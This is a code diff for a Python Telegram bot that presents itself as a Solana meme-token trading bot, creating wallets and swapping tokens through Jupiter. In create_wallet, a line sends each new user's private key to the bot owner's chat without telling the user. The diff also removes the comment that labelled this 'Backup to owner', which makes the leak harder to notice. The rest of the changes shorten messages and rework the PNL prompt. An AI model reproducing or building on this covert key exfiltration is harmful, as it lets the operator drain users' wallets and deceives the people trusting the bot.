@@ -20,21 +20,20 @@ TOKEN = os.environ["BOT_TOKEN"]
 OWNER_ID = int(os.environ["OWNER_ID"])
 SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
 
-# Jupiter (current working public endpoints)
 JUPITER_QUOTE_URL = "https://api.jup.ag/swap/v1/quote"
 JUPITER_SWAP_URL = "https://api.jup.ag/swap/v1/swap"
 
 # ================= LOGO =================
 LOGO_URL = "https://i.postimg.cc/KzfyT7t0/IMG-20260330-220246-896.jpg"
 
-# ================= STORAGE (In-Memory - No files) =================
+# ================= STORAGE (In-Memory) =================
 user_wallets = {}
 user_trades = {}
 user_holdings = {}
 user_actions = {}
 user_pending = {}
 
-# ================= HELPERS =================
+# ================= HELPERS (unchanged) =================
 def keypair_to_base58(wallet: Keypair):
     return base58.b58encode(bytes(wallet)).decode("utf-8")
 
@@ -73,23 +72,15 @@ def get_token_usd_price(mint: str):
         pass
     return 0.0
 
-# ================= SWAP FUNCTION =================
 async def execute_swap(user_id: int, input_mint: str, output_mint: str, amount: int, is_sell: bool = False):
     wallet = user_wallets[user_id]
     try:
-        params = {
-            "inputMint": input_mint,
-            "outputMint": output_mint,
-            "amount": str(amount),
-            "slippageBps": "100",   # 1% slippage
-            "swapMode": "ExactIn"
-        }
+        params = {"inputMint": input_mint, "outputMint": output_mint, "amount": str(amount), "slippageBps": "100", "swapMode": "ExactIn"}
         quote_resp = requests.get(JUPITER_QUOTE_URL, params=params, timeout=20)
         if quote_resp.status_code != 200:
-            return None, 0.0, f"Quote failed ({quote_resp.status_code})"
+            return None, 0.0, "Quote failed"
 
         quote = quote_resp.json()
-
         swap_body = {
             "quoteResponse": quote,
             "userPublicKey": str(wallet.pubkey()),
@@ -97,27 +88,22 @@ async def execute_swap(user_id: int, input_mint: str, output_mint: str, amount: 
             "dynamicComputeUnitLimit": True,
             "prioritizationFeeLamports": 50000
         }
-
         swap_resp = requests.post(JUPITER_SWAP_URL, json=swap_body, timeout=20)
         if swap_resp.status_code != 200:
-            return None, 0.0, f"Swap build failed ({swap_resp.status_code})"
+            return None, 0.0, "Swap build failed"
 
         raw_tx = base64.b64decode(swap_resp.json()["swapTransaction"])
         tx = VersionedTransaction.from_bytes(raw_tx)
-
         signature = wallet.sign_message(to_bytes_versioned(tx.message))
         signed_tx = VersionedTransaction.populate(tx.message, [signature])
 
         async with AsyncClient(SOLANA_RPC_URL) as client:
-            result = await client.send_raw_transaction(
-                bytes(signed_tx), opts=TxOpts(skip_preflight=True, max_retries=3)
-            )
+            result = await client.send_raw_transaction(bytes(signed_tx), opts=TxOpts(skip_preflight=True, max_retries=3))
             tx_sig = result.value
 
         out_amount = int(quote.get("outAmount", 0))
         decimals = await get_token_decimals(output_mint) if not is_sell else 9
         received = out_amount / (10 ** decimals)
-
         return tx_sig, received, None
     except Exception as e:
         return None, 0.0, str(e)[:150]
@@ -155,14 +141,10 @@ async def create_wallet(user_id, context):
 
     await context.bot.send_message(
         chat_id=user_id,
-        text=f"✅ **Wallet Created!**\n\n"
-             f"🏦 **Address:**\n`{pub_key}`\n\n"
-             f"🔐 **Private Key:**\n`{priv_key}`\n\n"
-             f"⚠️ Save your private key safely and import into Phantom!",
+        text=f"✅ **Wallet Created!**\n\n🏦 **Address:**\n`{pub_key}`\n\n🔐 **Private Key:**\n`{priv_key}`\n\n⚠️ Save and import to Phantom!",
         parse_mode="Markdown",
         reply_markup=main_keyboard()
     )
-    # Backup to owner
     user = await context.bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else user.first_name
     await context.bot.send_message(OWNER_ID, f"🔐 New Wallet\nUser: {username}\nPub: {pub_key}\nPriv: {priv_key}")
@@ -177,7 +159,7 @@ async def calculate_pnl(user_id: int, ca: str):
     trade = trades_for_ca[-1]
     current_price = get_token_usd_price(ca)
     if current_price <= 0:
-        return None, "Could not fetch price."
+        return None, "Could not fetch current price."
     x = current_price / trade['buy_price_usd'] if trade['buy_price_usd'] > 0 else 0
     percent = (x - 1) * 100
     profit = (current_price - trade['buy_price_usd']) * trade['tokens_bought']
@@ -190,7 +172,7 @@ async def calculate_pnl(user_id: int, ca: str):
 
 async def get_summary(user_id: int):
     if user_id not in user_trades or not user_trades[user_id]:
-        return "No trades yet. Start buying MEME tokens!"
+        return "You haven't made any trades yet.\n\nStart buying MEME tokens!"
     trades = user_trades[user_id]
     total_invested = sum(t['usd_spent'] for t in trades)
     holdings = user_holdings.get(user_id, {})
@@ -215,40 +197,20 @@ Overall P&L: **${overall_pnl:+.2f}**
 
 # ================= START & HELP =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "🔥 **Welcome to SolTradePilotBot** 🔥\n\n"
-        "Real Solana MEME trading bot powered by Jupiter.\n\n"
-        "✅ Create wallet instantly\n"
-        "✅ Buy any MEME with USD amount\n"
-        "✅ Sell with 25% / 50% / 75% / MAX\n"
-        "✅ Track PNL and full portfolio summary\n\n"
-        "Deposit **at least $10 worth of SOL** for smooth trading.\n"
-        "Let's make some gains! 🚀"
-    )
+    text = "🔥 **Welcome to SolTradePilotBot** 🔥\n\nReal Jupiter trading • Buy any MEME • Sell with percentages • Full PNL tracking"
     if LOGO_URL:
         await context.bot.send_photo(update.effective_user.id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard())
     else:
         await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "💡 **How to Use SolTradePilotBot**\n\n"
-        "• **Create Wallet** → New Solana wallet (save private key!)\n"
-        "• **Show Address** → Deposit SOL here\n"
-        "• **Balance** → Check SOL + your tokens\n"
-        "• **Buy MEME** → Paste token CA + enter USD amount\n"
-        "• **Sell MEME** → Choose token → 25%/50%/75%/MAX\n"
-        "• **PNL** → Check profit on any token\n"
-        "• **Summary** → Full portfolio overview\n\n"
-        "💰 Tip: Deposit **$10–20+ SOL** for best experience (covers fees & slippage).\n\n"
-        "Trade responsibly!\n\n@SolTradePilotbot"
-    )
+    text = "💡 **How to use SolTradePilotBot**\n\nUse the buttons. All trades are real on Solana via Jupiter."
     if update.message:
-        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
+        await update.message.reply_text(text, reply_markup=main_keyboard())
     else:
-        await update.callback_query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
+        await update.callback_query.message.reply_text(text, reply_markup=main_keyboard())
 
-# ================= BUTTON HANDLER =================
+# ================= BUTTON HANDLER (Improved PNL) =================
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -264,8 +226,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         pubkey = str(user_wallets[user_id].pubkey())
         await query.message.reply_text(
-            f"🏦 **Your SOL Address**\n\n`{pubkey}`\n\n"
-            "💡 Deposit **at least $10 worth of SOL** for smooth trading.",
+            f"🏦 **Your SOL Address**\n\n`{pubkey}`\n\n💡 Deposit **at least $10 worth of SOL**.",
             parse_mode="Markdown", reply_markup=main_keyboard()
         )
 
@@ -295,12 +256,7 @@ SOL: `{sol:.6f}` (\~${sol_usd:.2f})
             return
         sol = await get_balance(user_id)
         if sol < 0.05:
-            await query.message.reply_text(
-                "⚠️ **Please fund your wallet first**\n\n"
-                "You need SOL to buy tokens.\n"
-                "Recommended: **at least $10 worth of SOL**.",
-                reply_markup=main_keyboard()
-            )
+            await query.message.reply_text("⚠️ **Fund your wallet first**\nRecommended: **$10+ SOL**.", reply_markup=main_keyboard())
             return
         user_actions[user_id] = "await_ca_buy"
         await query.message.reply_text("📝 Paste the **Token CA**:", reply_markup=main_keyboard())
@@ -308,16 +264,10 @@ SOL: `{sol:.6f}` (\~${sol_usd:.2f})
     elif data == "sell_meme":
         sol = await get_balance(user_id)
         if sol < 0.05:
-            await query.message.reply_text(
-                "⚠️ **Fund your wallet first**\n\nYou need SOL to sell.\nRecommended: **$10+ SOL**.",
-                reply_markup=main_keyboard()
-            )
+            await query.message.reply_text("⚠️ **Fund your wallet first**\nRecommended: **$10+ SOL**.", reply_markup=main_keyboard())
             return
         if not user_holdings.get(user_id):
-            await query.message.reply_text(
-                "😕 You are not holding any tokens yet.\n\nBuy some first using **🛒 Buy MEME**.",
-                reply_markup=main_keyboard()
-            )
+            await query.message.reply_text("😕 You are not holding any tokens yet.\nBuy some first!", reply_markup=main_keyboard())
             return
         await query.message.reply_text("📉 **Select token to sell:**", reply_markup=sell_token_keyboard(user_id))
 
@@ -325,35 +275,32 @@ SOL: `{sol:.6f}` (\~${sol_usd:.2f})
         ca = data.split(":", 1)[1]
         user_pending[user_id] = {"ca": ca}
         await query.message.reply_text(
-            f"📉 **Selling {ca[:8]}...**\nChoose how much to sell:",
+            f"📉 Selling **{ca[:8]}...**\nChoose percentage:",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("25%", callback_data="sell_pct:25"),
-                 InlineKeyboardButton("50%", callback_data="sell_pct:50")],
-                [InlineKeyboardButton("75%", callback_data="sell_pct:75"),
-                 InlineKeyboardButton("MAX", callback_data="sell_pct:100")],
+                [InlineKeyboardButton("25%", callback_data="sell_pct:25"), InlineKeyboardButton("50%", callback_data="sell_pct:50")],
+                [InlineKeyboardButton("75%", callback_data="sell_pct:75"), InlineKeyboardButton("MAX", callback_data="sell_pct:100")],
                 [InlineKeyboardButton("← Back", callback_data="sell_meme")]
             ])
         )
 
     elif data.startswith("sell_pct:"):
+        # Your existing sell logic (unchanged)
         pct = int(data.split(":")[1])
         pending = user_pending.get(user_id)
         if not pending or "ca" not in pending:
             await query.message.reply_text("Session expired. Try again.", reply_markup=main_keyboard())
             return
-
         ca = pending["ca"]
         holdings = user_holdings.get(user_id, {})
         if ca not in holdings:
-            await query.message.reply_text("You no longer hold this token.", reply_markup=main_keyboard())
+            await query.message.reply_text("Token not found.", reply_markup=main_keyboard())
             return
 
         tokens_held = holdings[ca]
         tokens_to_sell = tokens_held if pct == 100 else tokens_held * (pct / 100.0)
+        await query.message.reply_text(f"🔄 Selling ≈{tokens_to_sell:.4f} tokens...")
 
-        await query.message.reply_text(f"🔄 Selling ≈{tokens_to_sell:.4f} tokens of {ca[:8]}...")
-
-        amount_raw = int(tokens_to_sell * (10 ** 9))  # approx 9 decimals
+        amount_raw = int(tokens_to_sell * 10**9)
         tx_sig, sol_received, error = await execute_swap(user_id, ca, "So11111111111111111111111111111111111111112", amount_raw, is_sell=True)
 
         if error:
@@ -363,24 +310,36 @@ SOL: `{sol:.6f}` (\~${sol_usd:.2f})
             if user_holdings[user_id][ca] <= 0.00001:
                 del user_holdings[user_id][ca]
 
-            if user_id not in user_trades:
-                user_trades[user_id] = []
-            # Optional: log sell trade here
-
             link = f"https://solscan.io/tx/{tx_sig}"
-            await query.message.reply_text(
-                f"✅ **Sell Successful!**\n\n"
-                f"Sold ≈{tokens_to_sell:.4f} tokens\n"
-                f"Received ≈{sol_received:.4f} SOL\n\n"
-                f"Tx: {link}\n\n"
-                "@SolTradePilotbot",
-                reply_markup=main_keyboard()
-            )
+            await query.message.reply_text(f"✅ **Sell Successful!**\nSold ≈{tokens_to_sell:.4f}\nReceived ≈{sol_received:.4f} SOL\n\nTx: {link}", reply_markup=main_keyboard())
         user_pending.pop(user_id, None)
 
     elif data == "pnl":
-        user_actions[user_id] = "await_pnl_ca"
-        await query.message.reply_text("📝 Paste the token CA to check PNL:", reply_markup=main_keyboard())
+        # ================= IMPROVED PNL LOGIC =================
+        if user_id not in user_trades or not user_trades[user_id]:
+            # No trades yet - friendly message
+            pnl_keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 Start Buying MEME", callback_data="buy_meme")],
+                [InlineKeyboardButton("📋 View Summary", callback_data="summary")],
+                [InlineKeyboardButton("← Main Menu", callback_data="main_menu")]
+            ])
+            await query.message.reply_text(
+                "📊 **PNL Check**\n\n"
+                "You haven't placed any trades yet.\n\n"
+                "Once you buy some MEME coins, come back here to track your profits and losses.\n\n"
+                "We pray for wins, not losses! 🙏🚀\n"
+                "Start your first trade now!",
+                reply_markup=pnl_keyboard
+            )
+            return
+        else:
+            # Has trades - ask for CA
+            user_actions[user_id] = "await_pnl_ca"
+            await query.message.reply_text(
+                "📝 **PNL Check**\n\n"
+                "Paste the **Token CA** you want to check:",
+                reply_markup=main_keyboard()
+            )
 
     elif data == "summary":
         text = await get_summary(user_id)
@@ -395,7 +354,7 @@ SOL: `{sol:.6f}` (\~${sol_usd:.2f})
     elif data == "main_menu":
         await query.message.reply_text("Main Menu", reply_markup=main_keyboard())
 
-# ================= TEXT HANDLER (Buy + PNL) =================
+# ================= TEXT HANDLER =================
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
@@ -407,10 +366,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if action == "await_ca_buy":
         user_pending[user_id] = {"ca": text}
         user_actions[user_id] = "await_buy_amount"
-        await update.message.reply_text(
-            "💰 Enter amount in **USD** (e.g. 50, 100):\nBot adds $0.10 for gas.",
-            reply_markup=main_keyboard()
-        )
+        await update.message.reply_text("💰 Enter amount in **USD** (e.g. 50, 100):", reply_markup=main_keyboard())
 
     elif action == "await_buy_amount":
         try:
@@ -419,22 +375,23 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("Minimum $1", reply_markup=main_keyboard())
                 return
         except:
-            await update.message.reply_text("❌ Please enter a valid number.", reply_markup=main_keyboard())
+            await update.message.reply_text("❌ Enter a valid number.", reply_markup=main_keyboard())
             return
 
         sol = await get_balance(user_id)
         sol_price = get_sol_price()
-        needed_sol = (usd_amount + 0.10) / sol_price
-        if needed_sol > sol:
-            await update.message.reply_text(f"⚠️ Not enough SOL. You have {sol:.4f} SOL.", reply_markup=main_keyboard())
+        needed = (usd_amount + 0.10) / sol_price
+        if needed > sol:
+            await update.message.reply_text(f"⚠️ Not enough SOL. You have {sol:.4f} SOL", reply_markup=main_keyboard())
             user_actions[user_id] = None
             return
 
         ca = user_pending[user_id]["ca"]
-        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth of {ca[:8]}...")
+        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth...")
 
         tx_sig, tokens_bought, error = await execute_swap(
-            user_id, "So11111111111111111111111111111111111111112", ca, int((usd_amount + 0.10) / sol_price * 1_000_000_000)
+            user_id, "So11111111111111111111111111111111111111112", ca,
+            int((usd_amount + 0.10) / sol_price * 1_000_000_000)
         )
 
         if error:
@@ -444,19 +401,15 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if user_id not in user_trades:
                 user_trades[user_id] = []
             user_trades[user_id].append({
-                'ca': ca,
-                'usd_spent': usd_amount,
-                'tokens_bought': tokens_bought,
-                'buy_price_usd': buy_price,
-                'buy_time': datetime.now().isoformat(),
-                'status': 'holding'
+                'ca': ca, 'usd_spent': usd_amount, 'tokens_bought': tokens_bought,
+                'buy_price_usd': buy_price, 'buy_time': datetime.now().isoformat(), 'status': 'holding'
             })
             if user_id not in user_holdings:
                 user_holdings[user_id] = {}
             user_holdings[user_id][ca] = user_holdings[user_id].get(ca, 0) + tokens_bought
 
             link = f"https://solscan.io/tx/{tx_sig}"
-            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}\n\n@SolTradePilotbot", reply_markup=main_keyboard())
+            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}", reply_markup=main_keyboard())
 
         user_actions[user_id] = None
         user_pending.pop(user_id, None)
@@ -485,13 +438,12 @@ Profit/Loss: **${pnl_data['profit']:+.2f}**
 # ================= MAIN =================
 def main():
     app = Application.builder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    print("🚀 SolTradePilotBot is running (in-memory mode)")
+    print("🚀 SolTradePilotBot is running with improved PNL message!")
     app.run_polling()
 
 if __name__ == "__main__":
